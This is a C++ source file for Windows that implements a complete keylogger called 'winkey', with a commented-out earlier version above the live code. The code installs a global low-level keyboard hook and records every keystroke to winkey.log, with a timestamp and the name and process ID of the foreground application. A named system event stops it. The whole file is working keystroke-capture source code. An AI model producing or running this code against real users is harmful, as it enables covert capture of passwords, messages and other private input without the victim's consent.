//#include <windows.h>
//#include <psapi.h>
//#include <fstream>
//#include <string>
//#include <winuser.h>
//#include <iostream>

//#define WINKEY_STOP "Global\\stop_winkey_process"

//using namespace std;

//wofstream keyLog(L"winkey.log", ios::app);

//wstring getForegroundProcessInfo() {
//	HWND hwnd = GetForegroundWindow();
//	DWORD pid;

//	GetWindowThreadProcessId(hwnd, &pid);
//	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
//	wchar_t name[MAX_PATH] = L"unknown";

//	if (hProc) {
//		GetModuleBaseNameW(hProc, NULL, name, MAX_PATH);
//		CloseHandle(hProc);
//	}
//	return (wstring(name) + L" (" + to_wstring(pid) + L")");
//}

//wstring virtualKeyToString(DWORD vkCode) {
//	switch (vkCode) {
//		case VK_BACK:		return L"[BACKSPACE]";
//		case VK_TAB:		return L"[TAB]";
//		case VK_RETURN:		return L"[ENTER]";
//		case VK_SHIFT:		return L"[SHIFT]";
//		case VK_LSHIFT:		return L"[LEFT SHIFT]";
//		case VK_RSHIFT:		return L"[RIGHT SHIFT]";
//		case VK_CONTROL:	return L"[CONTROL]";
//		case VK_LCONTROL:	return L"[LEFT CONTROL]";
//		case VK_RCONTROL:	return L"[RIGHT CONTROL]";
//		case VK_MENU:		return L"[ALT]";
//		case VK_LMENU:		return L"[LEFT ALT]";
//		case VK_RMENU:		return L"[RIGHT ALT]";
//		case VK_ESCAPE:		return L"[ESCAPE]";
//		case VK_SPACE:		return L"[SPACE]";
//		case VK_CAPITAL:	return L"[CAPS LOCK]";
//		case VK_NUMLOCK:	return L"[NUM LOCK]";
//		case VK_SCROLL:		return L"[SCROLL LOCK]";
//		case VK_PAUSE:		return L"[PAUSE]";
//		case VK_SNAPSHOT:	return L"[PRINT SCREEN]";
//		case VK_INSERT:		return L"[INSERT]";
//		case VK_DELETE:		return L"[DELETE]";
//		case VK_HOME:		return L"[HOME]";
//		case VK_END:		return L"[END]";
//		case VK_PRIOR:		return L"[PAGE UP]";
//		case VK_NEXT:		return L"[PAGE DOWN]";
//		case VK_LEFT:		return L"[LEFT ARROW]";
//		case VK_UP:			return L"[UP ARROW]";
//		case VK_RIGHT:		return L"[RIGHT ARROW]";
//		case VK_DOWN:		return L"[DOWN ARROW]";
//		case VK_LWIN:		return L"[LEFT WINDOWS]";
//		case VK_RWIN:		return L"[RIGHT WINDOWS]";
//		case VK_APPS:		return L"[APPLICATIONS]";
//		case VK_SLEEP:		return L"[SLEEP]";
//		case VK_NUMPAD0:	return L"[NUMPAD 0]";
//		case VK_NUMPAD1:	return L"[NUMPAD 1]";
//		case VK_NUMPAD2:	return L"[NUMPAD 2]";
//		case VK_NUMPAD3:	return L"[NUMPAD 3]";
//		case VK_NUMPAD4:	return L"[NUMPAD 4]";
//		case VK_NUMPAD5:	return L"[NUMPAD 5]";
//		case VK_NUMPAD6:	return L"[NUMPAD 6]";
//		case VK_NUMPAD7:	return L"[NUMPAD 7]";
//		case VK_NUMPAD8:	return L"[NUMPAD 8]";
//		case VK_NUMPAD9:	return L"[NUMPAD 9]";
//		case VK_MULTIPLY:	return L"[NUMPAD *]";
//		case VK_ADD:		return L"[NUMPAD +]";
//		case VK_SEPARATOR:	return L"[NUMPAD SEP]";
//		case VK_SUBTRACT:	return L"[NUMPAD -]";
//		case VK_DECIMAL:	return L"[NUMPAD .]";
//		case VK_DIVIDE:		return L"[NUMPAD /]";
//		case VK_F1:			return L"[F1]";
//		case VK_F2:			return L"[F2]";
//		case VK_F3:			return L"[F3]";
//		case VK_F4:			return L"[F4]";
//		case VK_F5:			return L"[F5]";
//		case VK_F6:			return L"[F6]";
//		case VK_F7:			return L"[F7]";
//		case VK_F8:			return L"[F8]";
//		case VK_F9:			return L"[F9]";
//		case VK_F10:		return L"[F10]";
//		case VK_F11:		return L"[F11]";
//		case VK_F12:		return L"[F12]";
//		case VK_F13:		return L"[F13]";
//		case VK_F14:		return L"[F14]";
//		case VK_F15:		return L"[F15]";
//		case VK_F16:		return L"[F16]";
//		case VK_F17:		return L"[F17]";
//		case VK_F18:		return L"[F18]";
//		case VK_F19:		return L"[F19]";
//		case VK_F20:		return L"[F20]";
//		case VK_F21:		return L"[F21]";
//		case VK_F22:		return L"[F22]";
//		case VK_F23:		return L"[F23]";
//		case VK_F24:		return L"[F24]";
//		default:			return L"";
//	}
//}


//LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
//	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
//		KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
//		HWND hwnd = GetForegroundWindow();
//		DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
//		HKL hkl = GetKeyboardLayout(threadId);
//		BYTE state[256];

//		GetKeyboardState(state);
//		if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
//			state[VK_SHIFT] |= 0x80;
//		if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
//			state[VK_CAPITAL] |= 0x01;
//		WCHAR buff[8] = { 0 };
//		const unsigned int len = (unsigned int)ToUnicodeEx(keyInfo->vkCode, keyInfo->scanCode, state, buff, 8, 0, hkl);
//		wstring ws(buff, (len > 0 ? len : 0));
//		wstring keyStr = virtualKeyToString(keyInfo->vkCode);
//		if (keyStr.empty())
//			keyStr = ws.empty() ? L"[UNK]" : wstring(ws.begin(), ws.end());
//		keyLog << getForegroundProcessInfo() << " | " << keyStr << endl;
//	}
//	return CallNextHookEx(NULL, nCode, wParam, lParam);
//}

//int main() {
//	HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
//	MSG msg;

//	HANDLE eventHandler = OpenEventA(
//		SYNCHRONIZE,
//		FALSE,
//		WINKEY_STOP
//	);

//	//std::cout << keyLog.is_open() << "<-\n";
//	//keyLog << L"Nique tes morts\n";

//	wofstream file(L"myfile", ios::app);

//	while (GetMessageW(&msg, NULL, 0, 0)) {
//		TranslateMessage(&msg);
//		if (!WaitForSingleObject(eventHandler, 100))
//			break ; // End of program
//	}
//	UnhookWindowsHookEx(hook);
//	keyLog.close();
//	return 0;
//}

#include <windows.h>
#include <psapi.h>
#include <fstream>
#include <string>
#include <ctime>
#include <iomanip>

using namespace std;

#define WINKEY_STOP "Global\\stop_winkey_process"

wofstream keyLog("winkey.log", ios::app);

wstring getForegroundProcessInfo() {
    HWND hwnd = GetForegroundWindow();
    DWORD pid = 0;

    GetWindowThreadProcessId(hwnd, &pid);
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
    WCHAR path[MAX_PATH] = L"unknown";
    GetProcessImageFileNameW(hProc, path, MAX_PATH);
    CloseHandle(hProc);

    wstring fullPath(path);
    size_t pos = fullPath.find_last_of(L"\\/");
    wstring filename = (pos == wstring::npos) ? fullPath : fullPath.substr(pos + 1);

    return filename + L" (" + to_wstring(pid) + L")";
}

wstring virtualKeyToString(DWORD vkCode) {
    switch (vkCode) {
        case VK_BACK:       return L"[BACKSPACE]";
        case VK_TAB:        return L"[TAB]";
        case VK_RETURN:     return L"[ENTER]";
        case VK_SHIFT:      return L"[SHIFT]";
        case VK_LSHIFT:     return L"[LEFT SHIFT]";
        case VK_RSHIFT:     return L"[RIGHT SHIFT]";
        case VK_CONTROL:    return L"[CONTROL]";
        case VK_LCONTROL:   return L"[LEFT CONTROL]";
        case VK_RCONTROL:   return L"[RIGHT CONTROL]";
        case VK_MENU:       return L"[ALT]";
        case VK_LMENU:      return L"[LEFT ALT]";
        case VK_RMENU:      return L"[RIGHT ALT]";
        case VK_ESCAPE:     return L"[ESCAPE]";
        case VK_SPACE:      return L"[SPACE]";
        case VK_CAPITAL:    return L"[CAPS LOCK]";
        case VK_NUMLOCK:    return L"[NUM LOCK]";
        case VK_SCROLL:     return L"[SCROLL LOCK]";
        case VK_PAUSE:      return L"[PAUSE]";
        case VK_SNAPSHOT:   return L"[PRINT SCREEN]";
        case VK_INSERT:     return L"[INSERT]";
        case VK_DELETE:     return L"[DELETE]";
        case VK_HOME:       return L"[HOME]";
        case VK_END:        return L"[END]";
        case VK_PRIOR:      return L"[PAGE UP]";
        case VK_NEXT:       return L"[PAGE DOWN]";
        case VK_LEFT:       return L"[LEFT ARROW]";
        case VK_UP:         return L"[UP ARROW]";
        case VK_RIGHT:      return L"[RIGHT ARROW]";
        case VK_DOWN:       return L"[DOWN ARROW]";
        case VK_LWIN:       return L"[LEFT WINDOWS]";
        case VK_RWIN:       return L"[RIGHT WINDOWS]";
        case VK_APPS:       return L"[APPLICATIONS]";
        case VK_SLEEP:      return L"[SLEEP]";
        case VK_NUMPAD0:    return L"[NUMPAD 0]";
        case VK_NUMPAD1:    return L"[NUMPAD 1]";
        case VK_NUMPAD2:    return L"[NUMPAD 2]";
        case VK_NUMPAD3:    return L"[NUMPAD 3]";
        case VK_NUMPAD4:    return L"[NUMPAD 4]";
        case VK_NUMPAD5:    return L"[NUMPAD 5]";
        case VK_NUMPAD6:    return L"[NUMPAD 6]";
        case VK_NUMPAD7:    return L"[NUMPAD 7]";
        case VK_NUMPAD8:    return L"[NUMPAD 8]";
        case VK_NUMPAD9:    return L"[NUMPAD 9]";
        case VK_MULTIPLY:   return L"[NUMPAD *]";
        case VK_ADD:        return L"[NUMPAD +]";
        case VK_SEPARATOR:  return L"[NUMPAD SEP]";
        case VK_SUBTRACT:   return L"[NUMPAD -]";
        case VK_DECIMAL:    return L"[NUMPAD .]";
        case VK_DIVIDE:     return L"[NUMPAD /]";
        case VK_F1:         return L"[F1]";
        case VK_F2:         return L"[F2]";
        case VK_F3:         return L"[F3]";
        case VK_F4:         return L"[F4]";
        case VK_F5:         return L"[F5]";
        case VK_F6:         return L"[F6]";
        case VK_F7:         return L"[F7]";
        case VK_F8:         return L"[F8]";
        case VK_F9:         return L"[F9]";
        case VK_F10:        return L"[F10]";
        case VK_F11:        return L"[F11]";
        case VK_F12:        return L"[F12]";
        default:            return L"";
    }
}

wstring getTimeStamp() {
    time_t now = time(0);
    struct tm tstruct;
    wchar_t buf[80];

    localtime_s(&tstruct, &now);
    wcsftime(buf, sizeof(buf), L"%Y-%m-%d %X", &tstruct);
    return wstring(buf);
}

LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        HWND hwnd = GetForegroundWindow();
        DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
        HKL hkl = GetKeyboardLayout(threadId);
        BYTE state[256] = {0};
        GetKeyboardState(state);

        if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
            state[VK_SHIFT] |= 0x80;
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
            state[VK_CAPITAL] |= 0x01;

        WCHAR buff[8] = { 0 };
        const unsigned int len = (unsigned int)ToUnicodeEx(keyInfo->vkCode, keyInfo->scanCode, state, buff, 8, 0, hkl);
        wstring ws(buff, len);
        wstring keyStr = virtualKeyToString(keyInfo->vkCode);
        if (keyStr.empty())
            keyStr = ws.empty() ? L"[UNK]" : ws;
        keyLog << getTimeStamp() << L" | " << left << setw(30) << getForegroundProcessInfo() << L" | " << keyStr << L"\n";
        keyLog.flush();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

//int main() {
//    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
//    MSG msg;

//    while (GetMessage(&msg, NULL, 0, 0)) {
//        TranslateMessage(&msg);
//        DispatchMessage(&msg);
//    }

//    UnhookWindowsHookEx(hook);
//    keyLog.close();
//    return 0;
//}

int main() {
	HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
	MSG msg;

	HANDLE eventHandler = OpenEventA(
		SYNCHRONIZE,
		FALSE,
		WINKEY_STOP
	);

	while (GetMessageW(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
        DispatchMessage(&msg);
		if (!WaitForSingleObject(eventHandler, 100))
			break ; // End of program
	}
	UnhookWindowsHookEx(hook);
	keyLog.close();
	return 0;
}
